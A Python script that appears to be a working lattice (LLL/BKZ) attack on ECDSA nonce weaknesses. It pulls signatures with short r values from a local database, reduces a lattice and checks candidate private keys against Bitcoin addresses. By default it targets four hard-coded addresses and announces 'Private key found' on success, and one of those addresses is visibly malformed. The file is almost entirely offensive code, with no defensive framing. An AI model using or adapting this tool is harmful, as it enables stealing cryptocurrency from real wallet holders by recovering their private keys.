import sqlite3
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key
from fpylll import IntegerMatrix, LLL, BKZ

P = SECP256k1.order

def attack_address(address, max_bits=254):
    print(f"\nAttacking {address} with R-bits < {max_bits}")
    
    conn = sqlite3.connect('cryscout.db')
    cur = conn.cursor()
    cur.execute('SELECT r_int, s_int, z_int, r_bits FROM signatures WHERE address = ? AND r_bits < ?', (address, max_bits))
    rows = cur.fetchall()
    conn.close()
    
    if not rows:
        print("  No signatures found.")
        return
        
    sigs = []
    seen = set()
    for r, s, z, bits in rows:
        if (r, s) in seen: continue
        seen.add((r, s))
        sigs.append({
            'u': (pow(int(s), -1, P) * int(z)) % P,
            't': (pow(int(s), -1, P) * int(r)) % P,
            'bits': bits
        })
        
    print(f"  Found {len(sigs)} unique signatures with < {max_bits} bits.")
    n = len(sigs)
    if n < 2:
        print("  Not enough signatures.")
        return

    # Using fpylll
    mat = IntegerMatrix(n + 2, n + 2)
    for i in range(n):
        scale = 1 << (256 - sigs[i]['bits'])
        mat[i, i] = P * scale
        mat[n, i] = sigs[i]['t'] * scale
        mat[n+1, i] = sigs[i]['u'] * scale
        
    mat[n, n] = 1
    mat[n+1, n+1] = 1 << 256
    
    print(f"  Running fpylll LLL/BKZ on {n+2}x{n+2} matrix...")
    LLL.reduction(mat)
    #BKZ.reduction(mat, BKZ.Param(block_size=20))
    
    for i in range(mat.nrows):
        d = abs(int(mat[i, n]))
        if d == 0: continue
        for potential_d in [d, (P - d) % P]:
            if verify_key(potential_d, address):
                print(f"!!! SUCCESS !!! Private key found: {hex(potential_d)}")
                return potential_d
                
    # Also check BKZ
    print("  LLL failed, running BKZ-20...")
    BKZ.reduction(mat, BKZ.Param(block_size=20))
    for i in range(mat.nrows):
        d = abs(int(mat[i, n]))
        if d == 0: continue
        for potential_d in [d, (P - d) % P]:
            if verify_key(potential_d, address):
                print(f"!!! SUCCESS !!! Private key found: {hex(potential_d)}")
                return potential_d
                
    print("  Failed.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        attack_address(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 254)
    else:
        targets = [
            ("1FdPpELnjHfwSM4Nvi7LdYS4S4GVGsLUQY", 254),
            ("1PaJvUDUKm3Xr4F88v88v88v88v88v88v8", 254),
            ("13FKHnREotr4jrjiSJwPUpecogVT7Rj7bu", 254),
            ("16HYWQ8HbyZV38mSAFYk5fnZgEeD27B6s2", 254)
        ]
        for t, bits in targets:
            import sqlite3
            conn = sqlite3.connect('cryscout.db')
            cur = conn.cursor()
            cur.execute("SELECT address FROM signatures WHERE address LIKE ? LIMIT 1", (t[:15] + '%',))
            row = cur.fetchone()
            conn.close()
            if row:
                attack_address(row[0], bits)
